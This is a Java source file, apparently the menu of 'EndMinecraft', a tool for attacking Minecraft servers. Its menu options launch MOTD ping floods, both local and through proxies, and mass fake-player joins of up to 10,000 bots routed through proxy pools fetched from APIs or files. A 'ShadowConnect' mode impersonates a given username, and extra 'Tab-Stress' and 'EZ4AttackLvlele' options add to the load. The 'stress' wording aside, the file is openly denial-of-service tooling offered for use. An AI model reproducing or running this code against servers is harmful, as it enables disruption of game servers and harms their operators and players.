package me.alikomi.endminecraft;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
import luohuayu.EndMinecraftPlus.tasks.attack.*;
import luohuayu.MCForgeProtocol.MCForge;
import luohuayu.MCForgeProtocol.MCForgeMOTD;

public class Menu extends Utils {
    private String ip;
    private Scanner scanner;
    private int port;

    public Menu(Scanner sc) {
        this.scanner = sc;
    }

    public void setServer(String ip, int port) {
        this.ip = ip;
        this.port = port;
    }

    public void _1() {
        log("Motd Stress via Local");
        log("Input the duration (Default: 60sec)");
        int time = getCo(scanner.nextLine(), 60);
        log("Input thread (Default: 10)");
        int thread = getCo(scanner.nextLine(), 16);
        IAttack attack = new MotdAttack(ip, port, time, thread, 0);
        attack.start();
    }

    public void _2() {
        log("Fake users via Proxy", "Input the duration (Default: 3600sec)");
        int time = getCo(scanner.nextLine(), 3600);
        log("Input Max Stresser Quantity (Default: 10000)");
        int maxAttack = getCo(scanner.nextLine(), 10000);
        log("Input interval time that join (Default: 0ms)");
        int sleepTime = getCo(scanner.nextLine(), 0);
        log("Enable Tab-Stress? Input y or n (Default: n)");
        boolean tab = getCo(scanner.nextLine(), "n").equals("y");
        log("Enable EZ4AttackLvlele? Input y or n (Default: n)");
        boolean lele = getCo(scanner.nextLine(), "n").equals("y");
        getProxy();
        log("正在获取MOD列表..");
        Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
        log("MOD列表: " + Arrays.toString(modList.keySet().toArray()));
        DistributedBotAttack attack = new DistributedBotAttack(ip, port, time, maxAttack, sleepTime);
        attack.setBotConfig(lele, tab, modList);
        attack.start();
    }

    public void _3() {
        log("Motd Stress via Proxy");
        log("Input the duration (Default: 60sec)");
        int time = getCo(scanner.nextLine(), 60);
        log("Input thread (Default: 10)");
        int thread = getCo(scanner.nextLine(), 16);
        getProxy();
        IAttack attack = new DistributedMotdAttack(ip, port, time, thread, 0);
        attack.start();
    }

    public void _4() {
        log("ShadowConnect via Proxy", "Input the duration (Default: 3600sec)");
        int time = getCo(scanner.nextLine(), 3600);
        log("Input Max Stresser Quantity (Default: 10000)");
        int maxAttack = getCo(scanner.nextLine(), 10000);
        log("Input interval time that join (Default: 0ms)");
        int sleepTime = getCo(scanner.nextLine(), 0);
        log("Input username (Required):");
        String username = getCo(scanner.nextLine(), null);
        if (username == null) {
            log("Please input username");
            return;
        }
        log("Enable Tab-Stress? Input y or n (Default: n)");
        boolean tab = getCo(scanner.nextLine(), "n").equals("y");
        log("Enable EZ4AttackLvlele? Input y or n (Default: n)");
        boolean lele = getCo(scanner.nextLine(), "n").equals("y");
        getProxy();
        log("Getting Mods list..");
        Map<String, String> modList = new MCForgeMOTD().pingGetModsList(ip, port, MCForge.getProtocolVersion());
        log("Mods list: " + Arrays.toString(modList.keySet().toArray()));
        DistributedDoubleAttack attack = new DistributedDoubleAttack(ip, port, time, maxAttack, sleepTime);
        attack.setBotConfig(lele, tab, modList);
        attack.setUsername(username);
        attack.start();
    }

    public void getProxy() {
        log("Proxies Method:", "1.via API", "2.via http.txt", "3.BOTH");
        switch (getCo(scanner.nextLine(), 1)) {
        case 1:
            ProxyPool.getProxysFromAPIs();
            ProxyPool.runUpdateProxysTask(1200);
            break;
        case 2:
            ProxyPool.getProxysFromFile();
            break;
        case 3:
            ProxyPool.getProxysFromFile();
            ProxyPool.getProxysFromAPIs();
            ProxyPool.runUpdateProxysTask(1200);
            break;
        default:
            ProxyPool.getProxysFromAPIs();
            ProxyPool.runUpdateProxysTask(1200);
        }
    }

    public void selectVersion() {
        try {
            Class.forName("javassist.CtClass");
        } catch (ClassNotFoundException e) {
            Utils.loadLibrary(new File("lib", "javassist-3.22.0-CR2.jar"));
        }

        try {
            Class.forName("org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket");
            return;
        } catch (ClassNotFoundException e) {}

        File libDir = new File("lib");
        if (!libDir.exists()) libDir.mkdir();
        List<File> versionLibs = new ArrayList<>();
        for (File file : libDir.listFiles()) {
            if (file.getName().startsWith("MC-") && file.getName().endsWith(".jar"))
                versionLibs.add(file);
        }

        Collections.sort(versionLibs);

        log("Choose Minecraft Version");
        String info = "";
        for (int i = 0; i < versionLibs.size(); i++) {
            String filename = versionLibs.get(i).getName();
            info += "[" + String.valueOf(i + 1) + "]" + filename.substring("MC-".length(), filename.length() - ".jar".length()) + "  ";
        }
        log(info);
        try {
            int sel = getCo(scanner.nextLine(), 1);
            File versionLib = versionLibs.get(sel - 1);
            Utils.loadLibrary(versionLib);
        } catch (Exception e) {
            log("Load failed!");
            e.printStackTrace();
        }
    }
}
